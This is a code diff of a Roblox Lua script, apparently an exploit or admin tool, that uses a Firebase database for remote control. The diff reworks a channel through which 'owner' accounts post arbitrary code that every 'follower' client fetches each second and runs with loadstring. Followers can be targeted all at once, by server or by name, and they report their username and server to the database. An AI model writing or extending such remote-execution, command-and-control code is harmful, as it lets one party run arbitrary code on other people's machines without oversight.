@@ -154,12 +154,12 @@ local currentServerId = game.JobId
         end
 
         -- Limpieza Firebase solo para owners/admins
-        if isOwner or isAdmin then
+if isOwner or isAdmin then
             task.spawn(function()
                 CleanupOldData("/heartbeats")
                 CleanupOldData("/commands/" .. currentServerId)
                 CleanupOldData("/brings/" .. myUserId)
-                CleanupOldData("/executions/" .. myUserId)
+                CleanupOldData("/executions/owners/" .. myUserId)
             end)
         end
     end)
@@ -174,13 +174,13 @@ task.spawn(function()
     end
     if not (isOwner or isAdmin) then return end
 
-    while true do
-        task.wait(300) -- cada 5 minutos
+  while true do
+        task.wait(300)
         pcall(function()
             CleanupOldData("/heartbeats")
             CleanupOldData("/commands/" .. currentServerId)
             CleanupOldData("/brings/" .. myUserId)
-            CleanupOldData("/executions/" .. myUserId)
+            CleanupOldData("/executions/owners/" .. myUserId)
         end)
     end
 end)
@@ -999,13 +999,13 @@ task.spawn(function()
     if not isOwner and not isAdmin then
 
         -- Estado compartido entre los loops del follower
-        local followerState = {
-            ownerOnline = false,          -- ¿hay owner/admin activo?
-            lastOnlineCheck = 0,          -- cuándo fue el último chequeo
-            checkInterval = 30,           -- cada cuánto re-chequear si no hay nadie (30s)
-            heartbeatInterval = 8,        -- cada cuánto enviar heartbeat cuando hay alguien (8s)
+local followerState = {
+            ownerOnline = false,
+            lastOnlineCheck = 0,
+            checkInterval = 60,        -- ✅ FIX: aumentado de 30s a 60s (menos requests)
+            heartbeatInterval = 15,    -- ✅ FIX: aumentado de 8s a 15s (menos escrituras)
             lastHeartbeat = 0,
-            lastTriggerCheck = 0,         -- para detectar el flag de "forzar detección"
+            lastTriggerCheck = 0,
         }
 
         -- Chequear si hay owner/admin activo (máx 4 GETs)
@@ -1026,18 +1026,17 @@ if (p.role == "owner" or p.role == "admin")
 
         -- Enviar heartbeat a todos los owners/admins (registrarse como visible)
 local function SendHeartbeat()
-            pcall(function()
-                firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
-                    username  = LocalPlayer.Name,
-                    role      = "follower",
-                    server_id = currentServerId,
-                    place_id  = tostring(game.PlaceId),
-                    timestamp = os.time()
-                })
-            end)
-            followerState.lastHeartbeat = tick()
-        end
-
+    local ok = pcall(function()
+        firebaseRequest("PUT", "/heartbeats/" .. myUserId, {
+            username  = LocalPlayer.Name,
+            role      = "follower",
+            server_id = currentServerId,
+            place_id  = tostring(game.PlaceId),
+            timestamp = os.time()
+        })
+    end)
+    followerState.lastHeartbeat = tick()
+end
 
 -- ✅ LOOP PRINCIPAL DEL FOLLOWER
         task.spawn(function()
@@ -1135,19 +1134,36 @@ local result = firebaseRequest("GET", "/commands/" .. currentServerId)
             end
         end)
 
-        -- ✅ EXECUCIONES via Supabase
-        task.spawn(function()
+  task.spawn(function()
+            local lastProcessedExecs = {}
             while true do
                 task.wait(1)
-local result = firebaseRequest("GET", "/executions/" .. myUserId)
+                local result = firebaseRequest("GET", "/executions/owners")
                 if result and type(result) == "table" then
-                    for exKey, ex in pairs(result) do
-                        if ex.code then
-                            firebaseRequest("DELETE", "/executions/" .. myUserId .. "/" .. exKey)
-                            pcall(function()
-                                local func = loadstring(ex.code)
-                                if func then func() end
-                            end)
+                    for ownerId, ownerExecs in pairs(result) do
+                        if type(ownerExecs) == "table" then
+                            for execId, execData in pairs(ownerExecs) do
+                                if type(execData) == "table" and not lastProcessedExecs[execId] then
+                                    local shouldExecute = false
+                                    local tgt = tostring(execData.target or "")
+                                    local srvId = tostring(execData.serverId or "")
+                                    if tgt == ".all" then
+                                        shouldExecute = true
+                                    elseif tgt == ".s" and srvId == currentServerId then
+                                        shouldExecute = true
+                                    elseif tgt:lower() == LocalPlayer.Name:lower() then
+                                        shouldExecute = true
+                                    end
+                                    if shouldExecute and execData.code then
+                                        lastProcessedExecs[execId] = true
+                                        firebaseRequest("DELETE", "/executions/owners/" .. ownerId .. "/" .. execId)
+                                        pcall(function()
+                                            local func = loadstring(execData.code)
+                                            if func then func() end
+                                        end)
+                                    end
+                                end
+                            end
                         end
                     end
                 end
@@ -2140,92 +2156,23 @@ local cmdKey = tostring(os.time()) .. "_" .. myUserId
         end)
 
 if isOwner then
-            -- ✅ FUNCIÓN ÚNICA Y CORREGIDA
             local function ExecuteRemoteCode(code, target)
                 if code == "" then return end
                 target = (target or ".s"):gsub("^%s+", ""):gsub("%s+$", "")
-
-                executeBtn.Text = "⏳ Buscando jugadores..."
-                executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
-
-                local hearts = firebaseRequest("GET", "/heartbeats")
-
-                -- ✅ Bug fix: verificar que hearts sea tabla válida
-                if not hearts or type(hearts) ~= "table" then
-                    executeBtn.Text = "❌ Sin jugadores detectados"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
-                    task.wait(2)
-                    executeBtn.Text = "▶ Ejecutar"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
-                    return
-                end
-
-                local now = os.time()
-                local sentCount = 0
-                local execKey = tostring(os.time()) .. "_exec_" .. myUserId
-
-                -- ✅ Bug fix: normalizar currentServerId para comparación
-                local myServerIdStr = tostring(currentServerId or "")
-
-                for uid, p in pairs(hearts) do
-                    -- ✅ Ignorar entradas inválidas
-                    if type(p) ~= "table" then continue end
-                    local numId = tonumber(uid)
-                    if not numId then continue end
-                    -- No enviarse a sí mismo
-                    if tostring(uid) == tostring(myUserId) then continue end
-                    -- Solo jugadores activos (últimos 2 minutos)
-                    if (now - (p.timestamp or 0)) > 120 then continue end
-
-                    -- ✅ Bug fix: comparación robusta de server_id
-                    local pServerStr = tostring(p.server_id or "")
-                    local matchServer = (pServerStr ~= "" and pServerStr == myServerIdStr)
-                    local pName = tostring(p.username or ""):lower()
-                    local targetLower = target:lower()
-
-                    local shouldSend = false
-
-                    if target == ".s" or target == "" then
-                        -- ✅ Bug fix: si currentServerId está vacío, enviar a todos activos
-                        if myServerIdStr == "" then
-                            shouldSend = true
-                        else
-                            shouldSend = matchServer
-                        end
-                    elseif target == ".all" then
-                        shouldSend = true
-                    else
-                        -- Búsqueda por nombre parcial (mínimo 3 caracteres)
-                        if #targetLower >= 3 then
-                            shouldSend = pName == targetLower or pName:sub(1, #targetLower) == targetLower
-                        end
-                    end
-
-                    if shouldSend then
-                        local ok, err = pcall(function()
-                            firebaseRequest("PUT", "/executions/" .. tostring(uid) .. "/" .. execKey, {
-                                sender_id = myUserId,
-                                code      = code,
-                                timestamp = os.time()
-                            })
-                        end)
-                        if ok then
-                            sentCount += 1
-                        end
-                    end
-                end
-
-                if sentCount > 0 then
-                    executeBtn.Text = "✓ Enviado a " .. sentCount .. " jugador(es)"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
-                else
-                    executeBtn.Text = "⚠️ Nadie encontrado (target: " .. target .. ")"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
-                end
-                task.wait(2.5)
+                local execId = HttpService:GenerateGUID(false)
+                firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
+                    code = code,
+                    target = target,
+                    serverId = currentServerId,
+                    timestamp = os.time()
+                })
+                executeBtn.Text = "✓ Code Sent!"
+                executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
+                task.wait(1.5)
                 executeBtn.Text = "▶ Ejecutar"
                 executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
             end
+
 
             -- ✅ Conexión correcta (única, sin duplicados)
             executeBtn.MouseButton1Click:Connect(function()
